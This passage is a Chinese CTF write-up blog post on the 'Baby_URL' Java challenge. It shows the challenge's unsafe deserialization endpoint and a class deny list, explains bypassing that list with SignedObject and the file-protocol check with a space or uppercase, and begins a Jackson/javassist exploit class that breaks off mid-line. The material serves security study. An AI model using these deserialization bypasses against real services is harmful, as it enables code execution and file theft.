@@ -1,0 +1,666 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="EddieMurphy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="这次本来是想学习Jackson原生链才开始做这道题打复现，但是没想到的是这道题的两个做法让我学习到了Jackson原生链结合二次反序列化绕黑名单或者打TemplatesImpl恶意字节码。 学到如今更觉受益匪浅，话不多说，直接开审。 题目分析目录结构如下：  IndexController.java： 123456789101112131415161718192021222324252627282">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从巅峰极客2023Baby_URL看二次反序列化和Jackson原生链">
+<meta property="og:url" content="https://eddiemurphy89.github.io/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/index.html">
+<meta property="og:site_name" content="EddieMurphy&#39;s blog">
+<meta property="og:description" content="这次本来是想学习Jackson原生链才开始做这道题打复现，但是没想到的是这道题的两个做法让我学习到了Jackson原生链结合二次反序列化绕黑名单或者打TemplatesImpl恶意字节码。 学到如今更觉受益匪浅，话不多说，直接开审。 题目分析目录结构如下：  IndexController.java： 123456789101112131415161718192021222324252627282">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211530820.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211139099.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211143135.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211146962.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211151783.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211441966.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211445638.png">
+<meta property="article:published_time" content="2024-08-03T12:45:00.000Z">
+<meta property="article:modified_time" content="2024-08-03T13:22:23.646Z">
+<meta property="article:author" content="EddieMurphy">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://eddiemurphy89.github.io/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211530820.png">
+  
+  
+  
+  <title>从巅峰极客2023Baby_URL看二次反序列化和Jackson原生链 - EddieMurphy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"eddiemurphy89.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>EddieMurphy&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/chainsaw_man.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="从巅峰极客2023Baby_URL看二次反序列化和Jackson原生链"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-03 20:45" pubdate>
+          2024年8月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">从巅峰极客2023Baby_URL看二次反序列化和Jackson原生链</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>这次本来是想学习Jackson原生链才开始做这道题打复现，但是没想到的是这道题的两个做法让我学习到了Jackson原生链结合二次反序列化绕黑名单或者打TemplatesImpl恶意字节码。</p>
+<p>学到如今更觉受益匪浅，话不多说，直接开审。</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>目录结构如下：</p>
+<p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211530820.png" srcset="/img/loading.gif" lazyload alt="image-20240803211530820"></p>
+<p><strong>IndexController.java</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&#123;&quot;/hack&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hack</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String payload)</span> &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(payload.getBytes(StandardCharsets.UTF_8));<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(byteArrayInputStream);<br>            <span class="hljs-type">URLHelper</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (URLHelper)ois.readObject();<br>            System.out.println(o);<br>            System.out.println(o.url);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok!&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var6;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/file&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">file</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/file&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>            file.createNewFile();<br>        &#125;<br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        fis.read(bytes);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>URLHelper.java</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLHelper</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String url;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">URLVisiter</span> <span class="hljs-variable">visiter</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">URLHelper</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-built_in">this</span>.url = url;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        in.defaultReadObject();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.visiter != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.visiter.visitUrl(<span class="hljs-built_in">this</span>.url);<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/file&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>                file.createNewFile();<br>            &#125;<br><br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>            fos.write(result.getBytes());<br>            fos.close();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>URLVisitor.java</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLVisiter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">URLVisiter</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">visitUrl</span><span class="hljs-params">(String myurl)</span> &#123;<br>        <span class="hljs-keyword">if</span> (myurl.startsWith(<span class="hljs-string">&quot;file&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;file protocol is not allowed&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                url = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(myurl);<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(url.openStream()));<br>                <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>                String inputLine;<br>                <span class="hljs-keyword">while</span>((inputLine = in.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                    sb.append(inputLine);<br>                &#125;<br><br>                in.close();<br>                <span class="hljs-keyword">return</span> sb.toString();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>                <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var6;<br>                <span class="hljs-keyword">return</span> e.toString();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>很显然我们需要打&#x2F;hack路由反序列化进去，&#x2F;file就是一个读文件的功能。再看两个URL自定义模板类，它们都继承了Serializable接口。</p>
+<p>URLHelper重写了readObject方法，即为入口类。调用了任意类的visitUrl方法，并把结果写进文件里。</p>
+<p>URLVisiter通过指定url访问其内部资源然后返回。</p>
+<p>只不过我们需要注意的是&#x2F;hack路由的反序列化部分，它使用的是自定义的输入流的类<code>MyObjectInputStream</code>。这个类重写了<code>resolveClass</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLVisiter&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>&#125;;<br>        String[] var4 = denyClasses;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">denyClass</span> <span class="hljs-operator">=</span> var4[var6];<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>把InetAddress、CC链ban了，甚至把他自己写的URLVisitor和URLHelper给ban了，这里我们就引入第一个做法，应该也是预期解。</p>
+<h3 id="SignedObject打二次反序列化绕过黑名单"><a href="#SignedObject打二次反序列化绕过黑名单" class="headerlink" title="SignedObject打二次反序列化绕过黑名单"></a>SignedObject打二次反序列化绕过黑名单</h3><p><code>SignedObject</code>的二次反序列化能够让我们正常使用到题目提供的<code>URLHelper</code>和<code>URLVister</code>，然后思路也很清晰，就是打<code>/hack</code>反序列化，file的<code>startWith</code>绕过可以在前面加个空格，或者全大写绕过。第一次读取目录和文件名找flag（是的，file:&#x2F;&#x2F;可以读目录），第二次读取flag。<code>/flie</code>路由可以读取到回显内容。</p>
+<p>所以Exp呼之欲出，用<code>Jackson</code>原生链套上<code>SignedObject</code>打二次反序列化：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLHelper;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLVisiter;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.PrivateKey;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> 